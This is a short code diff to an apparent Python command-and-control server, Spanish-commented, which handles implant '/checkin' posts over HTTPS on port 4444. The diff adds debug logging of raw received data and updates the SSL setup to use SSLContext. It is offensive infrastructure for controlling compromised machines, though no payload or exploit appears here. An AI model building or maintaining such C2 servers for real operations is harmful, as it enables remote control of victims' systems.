@@ -13,8 +13,10 @@ class C2Handler(BaseHTTPRequestHandler):
         self.end_headers()
     
     def do_POST(self):
+        print(f"[*] Received POST to {self.path} from {self.client_address}")
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
+        print(f"[*] Raw data: {post_data}")
         
         if self.path == '/checkin':
             data = json.loads(post_data)
@@ -38,13 +40,9 @@ def run_server():
     httpd = ThreadedHTTPServer(server_address, C2Handler)
     
     # Configurar SSL
-    httpd.socket = ssl.wrap_socket(
-        httpd.socket,
-        server_side=True,
-        certfile='./resources/cert.pem',
-        keyfile='./resources/key.pem',
-        ssl_version=ssl.PROTOCOL_TLS
-    )
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    context.load_cert_chain(certfile='./resources/cert.pem', keyfile='./resources/key.pem')
+    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
     
     print("[*] Servidor C2 iniciado en https://0.0.0.0:4444")
     httpd.serve_forever()
